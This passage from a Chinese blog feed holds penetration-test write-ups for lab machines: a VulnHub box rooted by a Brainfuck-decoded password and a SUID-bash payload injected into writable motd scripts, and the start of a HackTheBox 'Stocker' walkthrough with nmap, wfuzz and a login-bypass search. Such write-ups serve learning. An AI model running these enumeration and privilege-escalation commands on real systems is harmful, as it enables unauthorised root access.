class="hljs-string">&quot;/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&quot;</span><br><span class="hljs-built_in">declare</span> -x PWD=<span class="hljs-string">&quot;/var/backups&quot;</span><br><span class="hljs-built_in">declare</span> -x SHLVL=<span class="hljs-string">&quot;1&quot;</span><br></code></pre></td></tr></table></figure><p>定时任务、环境变量不存在有效信息，看看 s 权限的文件和可写权限文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@ubuntu:/var/run$ find / -<span class="hljs-built_in">type</span> f -perm -u=s 2&gt;/dev/null<br>find / -<span class="hljs-built_in">type</span> f -perm -u=s 2&gt;/dev/null                                                                                                                                                                             <br>/bin/umount                                                                                                                                                                                                       <br>/bin/mount<br>/bin/ntfs-3g<br>/bin/su<br>/bin/fusermount<br>/bin/ping<br>/usr/lib/dbus-1.0/dbus-daemon-launch-helper<br>/usr/lib/eject/dmcrypt-get-device<br>/usr/lib/openssh/ssh-keysign<br>/usr/bin/vmware-user-suid-wrapper<br>/usr/bin/newgrp<br>/usr/bin/sudo<br>/usr/bin/chsh<br>/usr/bin/gpasswd<br>/usr/bin/chfn<br>/usr/bin/passwd<br>/usr/bin/traceroute6.iputils<br></code></pre></td></tr></table></figure><p>读写文件中呢</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@ubuntu:/var/run$ find / -<span class="hljs-built_in">type</span> f -writable 2&gt;/dev/null<br>find / -<span class="hljs-built_in">type</span> f -writable 2&gt;/dev/null<br>/mnt/hell.sh<br>/etc/update-motd.d/91-release-upgrade<br>/etc/update-motd.d/00-header<br>/etc/update-motd.d/50-motd-news<br>/etc/update-motd.d/80-esm<br>/etc/update-motd.d/80-livepatch<br>/etc/update-motd.d/10-help-text<br>/etc/apache2/users.password<br>/var/www/webdav/DavLock<br>/var/www/webdav/php-reverse-shell.php<br>/var/www/html/index.html<br>/var/www/html/style.css<br>/var/www/html/images/9.jpg<br>/var/www/html/images/10.jpg<br>/var/www/html/images/7.jpg<br>/var/www/html/images/666.jpg<br>/var/www/html/images/13.jpg<br>/var/www/html/images/3.jpg<br>/var/www/html/images/19.jpg<br>/var/www/html/images/4.jpg<br>/var/www/html/images/14.jpg<br>/var/www/html/images/16.jpg<br>/var/www/html/images/5.jpg<br>/var/www/html/images/12.jpg<br>/var/www/html/images/18.jpg<br>/var/www/html/images/15.jpg<br>/var/www/html/images/8.jpg<br>/var/www/html/images/6.jpg<br>/var/www/html/images/1.jpg<br>/var/www/html/images/2.jpg<br>/var/www/html/images/11.jpg<br>/var/www/html/images/17.jpg<br>/var/www/html/font.css<br>/var/www/DavLock<br>www-data@ubuntu:/var/run$ <span class="hljs-built_in">cat</span> /etc/apache2/users.password<br><span class="hljs-built_in">cat</span> /etc/apache2/users.password<br>yamdoot:webdav:8ef09831d201bd84acb0ef99a4a98a91<br>www-data@ubuntu:/var/run$ <span class="hljs-built_in">cat</span> /mnt/hell.sh<br><span class="hljs-built_in">cat</span> /mnt/hell.sh<br><span class="hljs-comment">#!/bin/bash</span><br><br><span class="hljs-built_in">echo</span><span class="hljs-string">&quot;Highway to Hell&quot;</span>;<br>--[-----&gt;+&lt;]&gt;---.+++++.+.+++++++++++.--.+++[-&gt;+++&lt;]&gt;++.++++++.--[---&gt;+&lt;]&gt;--.-----.++++.<br>www-data@ubuntu:/var/run$ <span class="hljs-built_in">ls</span> -liah /mnt/hell.sh<br><span class="hljs-built_in">ls</span> -liah /mnt/hell.sh<br>920902 -rwxrwxrwx 1 root root 124 Sep 22  2020 /mnt/hell.sh<br></code></pre></td></tr></table></figure><h3 id="brainfuck-语言"><a href="#brainfuck-语言" class="headerlink" title="brainfuck 语言"></a>brainfuck 语言</h3><p>看到了一个有意思的 sh 文件，看起来语法好奇怪（，并不了解。经过红队笔记的视频，知道了这是 brainfuck 语言，下载 beef 工具</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ beef bf             <br>chitragupt<br></code></pre></td></tr></table></figure><p>得到了字符串，根据之前的提示，猜测是个密码，根据 passwd 文件中的用户</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@ubuntu:/var/run$ su inferno<br>su inferno<br>Password: chitragupt<br><br>inferno@ubuntu:/var/run$ <span class="hljs-built_in">id</span><br><span class="hljs-built_in">id</span><br>uid=1002(inferno) gid=1002(inferno) <span class="hljs-built_in">groups</span>=1002(inferno)<br>inferno@ubuntu:/var/run$ <span class="hljs-built_in">whoami</span><br><span class="hljs-built_in">whoami</span><br>inferno<br>inferno@ubuntu:/var/run$ <span class="hljs-built_in">uname</span> -a<br><span class="hljs-built_in">uname</span> -a<br>Linux ubuntu 4.15.0-20-generic <span class="hljs-comment">#21-Ubuntu SMP Tue Apr 24 06:16:15 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux</span><br>inferno@ubuntu:/var/run$ ip a<br>ip a<br>1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000<br>    <span class="hljs-built_in">link</span>/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00<br>    inet 127.0.0.1/8 scope host lo<br>       valid_lft forever preferred_lft forever<br>    inet6 ::1/128 scope host <br>       valid_lft forever preferred_lft forever<br>2: ens33: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc fq_codel state UP group default qlen 1000<br>    <span class="hljs-built_in">link</span>/ether 00:0c:29:02:d4:d7 brd ff:ff:ff:ff:ff:ff<br>    inet 192.1.1.129/24 brd 192.1.1.255 scope global dynamic ens33<br>       valid_lft 1369sec preferred_lft 1369sec<br>    inet6 fe80::20c:29ff:fe02:d4d7/64 scope <span class="hljs-built_in">link</span> <br>       valid_lft forever preferred_lft forever<br>inferno@ubuntu:/var/run$ sudo -l<br>sudo -l<br>[sudo] password <span class="hljs-keyword">for</span> inferno: chitragupt <br><br>Sorry, user inferno may not run sudo on ubuntu.<br></code></pre></td></tr></table></figure><h3 id="用户移动"><a href="#用户移动" class="headerlink" title="用户移动"></a>用户移动</h3><p>inferno 用户登录成功</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">inferno@ubuntu:/var/run$ find / -<span class="hljs-built_in">type</span> f -perm -u=s 2&gt;/dev/null<br>find / -<span class="hljs-built_in">type</span> f -perm -u=s 2&gt;/dev/null<br>/bin/umount<br>/bin/mount<br>/bin/ntfs-3g<br>/bin/su<br>/bin/fusermount<br>/bin/ping<br>/usr/lib/dbus-1.0/dbus-daemon-launch-helper<br>/usr/lib/eject/dmcrypt-get-device<br>/usr/lib/openssh/ssh-keysign<br>/usr/bin/vmware-user-suid-wrapper<br>/usr/bin/newgrp<br>/usr/bin/sudo<br>/usr/bin/chsh<br>/usr/bin/gpasswd<br>/usr/bin/chfn<br>/usr/bin/passwd<br>/usr/bin/traceroute6.iputils<br></code></pre></td></tr></table></figure><p>信息收集一波</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">inferno@ubuntu:/var/run$ <span class="hljs-built_in">cd</span> /home<br><span class="hljs-built_in">cd</span> /home<br>inferno@ubuntu:/home$ <span class="hljs-built_in">ls</span><br><span class="hljs-built_in">ls</span><br>inferno  narak  yamdoot<br>inferno@ubuntu:/home$ <span class="hljs-built_in">cd</span> inferno<br><span class="hljs-built_in">cd</span> inferno<br>inferno@ubuntu:~$ <span class="hljs-built_in">ls</span><br><span class="hljs-built_in">ls</span><br>user.txt<br>inferno@ubuntu:~$ <span class="hljs-built_in">cat</span> user.txt<br><span class="hljs-built_in">cat</span> user.txt<br>Flag: &#123;5f95bf06ce19af69bfa5e53f797ce6e2&#125;<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">inferno@ubuntu:/home$ find / -writable -<span class="hljs-built_in">type</span> f -not -path <span class="hljs-string">&quot;/proc/*&quot;</span> -not -path <span class="hljs-string">&quot;/sys/*&quot;</span> 2&gt;/dev/null<br>&lt;not -path <span class="hljs-string">&quot;/proc/*&quot;</span> -not -path <span class="hljs-string">&quot;/sys/*&quot;</span> 2&gt;/dev/null<br>/mnt/hell.sh<br>/home/inferno/.bash_logout<br>/home/inferno/.bashrc<br>/home/inferno/.profile<br>/etc/update-motd.d/91-release-upgrade<br>/etc/update-motd.d/00-header<br>/etc/update-motd.d/50-motd-news<br>/etc/update-motd.d/80-esm<br>/etc/update-motd.d/80-livepatch<br>/etc/update-motd.d/10-help-text<br></code></pre></td></tr></table></figure><h3 id="motd-提权"><a href="#motd-提权" class="headerlink" title="motd 提权"></a>motd 提权</h3><p>这里的过滤语法最好记住，以后操作会更流畅，此外 motd 也是常见的提权方法</p><p><img src="/pic/d406d2b9694d3bf399b976f8a1b7c97b_MD5.png"></p><p>搜索后，按这个手法进行操作，注意这里需要退出后用 ssh 重新登录才能达到目的</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">inferno@ubuntu:/home$ <span class="hljs-built_in">ls</span> -al /etc/update-motd.d/<br><span class="hljs-built_in">ls</span> -al /etc/update-motd.d/<br>total 36<br>drwxrwxrwx  2 root root 4096 Sep 21  2020 .<br>drwxr-xr-x 80 root root 4096 Sep 22  2020 ..<br>-rwxrwxrwx  1 root root 1220 Apr  9  2018 00-header<br>-rwxrwxrwx  1 root root 1157 Apr  9  2018 10-help-text<br>-rwxrwxrwx  1 root root 4251 Apr  9  2018 50-motd-news<br>-rwxrwxrwx  1 root root  604 Mar 21  2018 80-esm<br>-rwxrwxrwx  1 root root 3017 Mar 21  2018 80-livepatch<br>-rwxrwxrwx  1 root root  299 May 18  2017 91-release-upgrade<br>inferno@ubuntu:/home$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;cp /bin/bash /home/inferno/bash &amp;&amp; chmod u+s /home/inferno/bash&quot;</span> &gt;&gt; /etc/update-motd.d/00-header<br></code></pre></td></tr></table></figure><p>ssh 登录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ ssh inferno@192.1.1.129                  <br>The authenticity of host <span class="hljs-string">&#x27;192.1.1.129 (192.1.1.129)&#x27;</span> can\<span class="hljs-string">&#x27;t be established.</span><br><span class="hljs-string">ED25519 key fingerprint is SHA256:A4qSwLMJMXo/YuhKxw/H/4ezPo8GmE3SuuMQr98X7TU.</span><br><span class="hljs-string">This key is not known by any other names</span><br><span class="hljs-string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span><br><span class="hljs-string">Warning: Permanently added &#x27;</span>192.1.1.129<span class="hljs-string">&#x27; (ED25519) to the list of known hosts.</span><br><span class="hljs-string">inferno@192.1.1.129\&#x27;</span>s password: <br>Welcome to Ubuntu 18.04 LTS (GNU/Linux 4.15.0-20-generic x86_64)<br><br> * Documentation:  https://help.ubuntu.com<br> * Management:     https://landscape.canonical.com<br> * Support:        https://ubuntu.com/advantage<br><br><br> * Canonical Livepatch is available <span class="hljs-keyword">for</span> installation.<br>   - Reduce system reboots and improve kernel security. Activate at:<br>     https://ubuntu.com/livepatch<br><br>The programs included with the Ubuntu system are free software;<br>the exact distribution terms <span class="hljs-keyword">for</span> each program are described <span class="hljs-keyword">in</span> the<br>individual files <span class="hljs-keyword">in</span> /usr/share/doc/*/copyright.<br><br>Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by<br>applicable law.<br><br>inferno@ubuntu:~$ ./bash -p<br>bash-4.4<span class="hljs-comment"># id</span><br>uid=1002(inferno) gid=1002(inferno) euid=0(root) <span class="hljs-built_in">groups</span>=1002(inferno)<br>bash-4.4<span class="hljs-comment"># whoami</span><br>root<br>bash-4.4<span class="hljs-comment"># cd /root</span><br>bash-4.4<span class="hljs-comment"># ls</span><br>root.txt<br>bash-4.4<span class="hljs-comment"># cat root.txt</span><br>██████████████████████████████████████████████████████████████████████████████████████████<br>█░░░░░░██████████░░░░░░█░░░░░░░░░░░░░░█░░░░░░░░░░░░░░░░███░░░░░░░░░░░░░░█░░░░░░██░░░░░░░░█<br>█░░▄▀░░░░░░░░░░██░░▄▀░░█░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀▄▀▄▀▄▀▄▀▄▀░░███░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀░░██░░▄▀▄▀░░█<br>█░░▄▀▄▀▄▀▄▀▄▀░░██░░▄▀░░█░░▄▀░░░░░░▄▀░░█░░▄▀░░░░░░░░▄▀░░███░░▄▀░░░░░░▄▀░░█░░▄▀░░██░░▄▀░░░░█<br>█░░▄▀░░░░░░▄▀░░██░░▄▀░░█░░▄▀░░██░░▄▀░░█░░▄▀░░████░░▄▀░░███░░▄▀░░██░░▄▀░░█░░▄▀░░██░░▄▀░░███<br>█░░▄▀░░██░░▄▀░░██░░▄▀░░█░░▄▀░░░░░░▄▀░░█░░▄▀░░░░░░░░▄▀░░███░░▄▀░░░░░░▄▀░░█░░▄▀░░░░░░▄▀░░███<br>█░░▄▀░░██░░▄▀░░██░░▄▀░░█░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀▄▀▄▀▄▀▄▀▄▀░░███░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀▄▀▄▀▄▀▄▀░░███<br>█░░▄▀░░██░░▄▀░░██░░▄▀░░█░░▄▀░░░░░░▄▀░░█░░▄▀░░░░░░▄▀░░░░███░░▄▀░░░░░░▄▀░░█░░▄▀░░░░░░▄▀░░███<br>█░░▄▀░░██░░▄▀░░░░░░▄▀░░█░░▄▀░░██░░▄▀░░█░░▄▀░░██░░▄▀░░█████░░▄▀░░██░░▄▀░░█░░▄▀░░██░░▄▀░░███<br>█░░▄▀░░██░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀░░██░░▄▀░░█░░▄▀░░██░░▄▀░░░░░░█░░▄▀░░██░░▄▀░░█░░▄▀░░██░░▄▀░░░░█<br>█░░▄▀░░██░░░░░░░░░░▄▀░░█░░▄▀░░██░░▄▀░░█░░▄▀░░██░░▄▀▄▀▄▀░░█░░▄▀░░██░░▄▀░░█░░▄▀░░██░░▄▀▄▀░░█<br>█░░░░░░██████████░░░░░░█░░░░░░██░░░░░░█░░░░░░██░░░░░░░░░░█░░░░░░██░░░░░░█░░░░░░██░░░░░░░░█<br>██████████████████████████████████████████████████████████████████████████████████████████<br>                           <br>                                                                                    <br>Root Flag: &#123;9440aee508b6215995219c58c8ba4b45&#125;<br><br>!! Congrats you have finished this task !!<br><br>Contact us here:<br><br>Hacking Articles : https://twitter.com/hackinarticles<br><br>Jeenali Kothari  : https://www.linkedin.com/in/jeenali-kothari/<br><br>+-+-+-+-+-+ +-+-+-+-+-+-+-+<br> |E|n|j|o|y| |H|A|C|K|I|N|G|<br> +-+-+-+-+-+ +-+-+-+-+-+-+-+<br>__________________________________<br><br>bash-4.4<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>knowledge_database</category>
      
      <category>vulnhub</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Stocker靶机</title>
    <link href="/2023/06/9690503462f3.html"/>
    <url>/2023/06/9690503462f3.html</url>
    
    <content type="html"><![CDATA[<h1 id="Stocker-靶机"><a href="#Stocker-靶机" class="headerlink" title="Stocker 靶机"></a>Stocker 靶机</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(i3eg1nner㉿minilite)-[~]<br>└─$ sudo nmap --min-rate 10000 -p- 10.10.11.196<br>[sudo] password <span class="hljs-keyword">for</span> i3eg1nner:<br>Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-07 21:34 EDT<br>Warning: 10.10.11.196 giving up on port because retransmission <span class="hljs-built_in">cap</span> hit (10).<br>Nmap scan report <span class="hljs-keyword">for</span> stocker.htb (10.10.11.196)<br>Host is up (0.037s latency).<br>Not shown: 64550 closed tcp ports (reset), 983 filtered tcp ports (no-response)<br>PORT   STATE SERVICE<br>22/tcp open  ssh<br>80/tcp open  http<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 30.17 seconds<br><br>┌──(i3eg1nner㉿minilite)-[~]<br>└─$ sudo nmap -sT -sV -sC -p22,80 10.10.11.196<br>Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-07 21:36 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> stocker.htb (10.10.11.196)<br>Host is up (0.0044s latency).<br><br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)<br>| ssh-hostkey:<br>|   3072 3d12971d86bc161683608f4f06e6d54e (RSA)<br>|   256 7c4d1a7868ce1200df491037f9ad174f (ECDSA)<br>|_  256 dd978050a5bacd7d55e827ed28fdaa3b (ED25519)<br>80/tcp open  http    nginx 1.18.0 (Ubuntu)<br>|_http-title: Stock - Coming Soon!<br>|_http-generator: Eleventy v2.0.0<br>|_http-server-header: nginx/1.18.0 (Ubuntu)<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 7.01 seconds<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(i3eg1nner㉿minilite)-[~]<br>└─$ sudo nmap --script=vuln -p22,80 10.10.11.196<br>Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-07 21:37 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> stocker.htb (10.10.11.196)<br>Host is up (0.0036s latency).<br><br>PORT   STATE SERVICE<br>22/tcp open  ssh<br>80/tcp open  http<br>| http-vuln-cve2011-3192:<br>|   VULNERABLE:<br>|   Apache byterange filter DoS<br>|     State: VULNERABLE<br>|     IDs:  BID:49303  CVE:CVE-2011-3192<br>|       The Apache web server is vulnerable to a denial of service attack when numerous<br>|       overlapping byte ranges are requested.<br>|     Disclosure <span class="hljs-built_in">date</span>: 2011-08-19<br>|     References:<br>|       https://www.securityfocus.com/bid/49303<br>|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-3192<br>|       https://seclists.org/fulldisclosure/2011/Aug/175<br>|_      https://www.tenable.com/plugins/nessus/55976<br>|_http-dombased-xss: Couldn<span class="hljs-string">&#x27;t find any DOM based XSS.</span><br><span class="hljs-string">|_http-stored-xss: Couldn&#x27;</span>t find any stored XSS vulnerabilities.<br>|_http-csrf: Couldn<span class="hljs-string">&#x27;t find any CSRF vulnerabilities.</span><br><span class="hljs-string"></span><br><span class="hljs-string">Nmap done: 1 IP address (1 host up) scanned in 76.35 seconds</span><br></code></pre></td></tr></table></figure><p>获得的信息：开放了 22 和 80 端口，没有明显的漏洞信息，大概率是 Linux 服务系统，实际上 nmap 扫描 80 端口时会获得的 title 是被重定向到了 <code>stocker.htb</code> 域名，修改 hosts 文件后，访问才会正常（之所以有这种设置，是因为一个 IP 可能绑定了多个域名）</p><h2 id="Web-渗透"><a href="#Web-渗透" class="headerlink" title="Web 渗透"></a>Web 渗透</h2><h3 id="网站信息收集"><a href="#网站信息收集" class="headerlink" title="网站信息收集"></a>网站信息收集</h3><p>接下来我尝试了目录爆破、网页源代码查看、证书查看、cookie 查看，这个页面里似乎没有可以利用的信息，接下来只能考虑子域名了（犹豫，看了 WP 才确定）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(i3eg1nner㉿minilite)-[~]<br>└─$ wfuzz --hc 301 -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H <span class="hljs-string">&quot;HOST: FUZZ.stocker.htb&quot;</span> http://stocker.htb/<br> /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz\<span class="hljs-string">&#x27;s documentation for more information.</span><br><span class="hljs-string">********************************************************</span><br><span class="hljs-string">* Wfuzz 3.1.0 - The Web Fuzzer                         *</span><br><span class="hljs-string">********************************************************</span><br><span class="hljs-string"></span><br><span class="hljs-string">Target: http://stocker.htb/</span><br><span class="hljs-string">Total requests: 4989</span><br><span class="hljs-string"></span><br><span class="hljs-string">=====================================================================</span><br><span class="hljs-string">ID           Response   Lines    Word       Chars       Payload</span><br><span class="hljs-string">=====================================================================</span><br><span class="hljs-string"></span><br><span class="hljs-string">000000019:   302        0 L      4 W        28 Ch       &quot;dev - dev&quot;</span><br><span class="hljs-string"></span><br><span class="hljs-string">Total time: 0</span><br><span class="hljs-string">Processed Requests: 4989</span><br><span class="hljs-string">Filtered Requests: 4988</span><br><span class="hljs-string">Requests/sec.: 0</span><br><span class="hljs-string"></span><br></code></pre></td></tr></table></figure><p>wfuzz 比想象中得好用，找时间看看它的使用技巧。这里拿到了子域名前缀 dev，修改 hosts 文件将其也添加进去，然后访问子域名，得到了登录界面</p><p><img src="/pic/93efad5c38f5a1d1df92c92066b41697_MD5.png"></p><h3 id="node-注入"><a href="#node-注入" class="headerlink" title="node 注入"></a>node 注入</h3><p>登录界面中没有明显的利用点，尝试 SQL 注入似乎也无效，这里一下子有点没头绪。</p><p><img src="/pic/eb3f7ed1c2e2ac25e87b7de4176df4f8_MD5.png"></p><p>拿到了一些网页架构的信息，尝试搜索搜索吧</p><p><img src="/pic/934f4015b24e8d3b1184afcb8f898464_MD5.png"></p><p>似乎的确有可以利用的地方，尝试了一些方法，json 格式似乎会被解析，但是没法直接利用，只能继续搜索</p><p><img src="/pic/027ff17d10ed157ed42a9e2b4e362204_MD5.png"></p><p>从上往下翻，没找到什么可以利用的地方……</p><p><img src="/pic/3c2cd34737a7de5b4d98ef0a8d54a6c1_MD5.png"></p><p>GitHub 中的这个项目开发了一个有漏洞的 nodejs web app，里面提到了一种注入攻击</p><p><img src="/pic/cb5e781d21a5cc9ff9e51e4a4a75b999_MD5.png"></p><p>尝试之后发现可行</p><p><img src="/pic/541511a0e8ff9d557cacdeb09aeeaa2b_MD5.png"></p><p>那就修改后让流量通过</p><p><img src="/pic/671059778ac4f3289782588c5327865f_MD5.png"></p><p>得到如下界面</p><p><img src="/pic/2b9a0d0756c187ef322c8ed83e2640ab_MD5.png"></p><p>好像是个购物界面，尝试加入购物车，然后点击下单</p><p><img 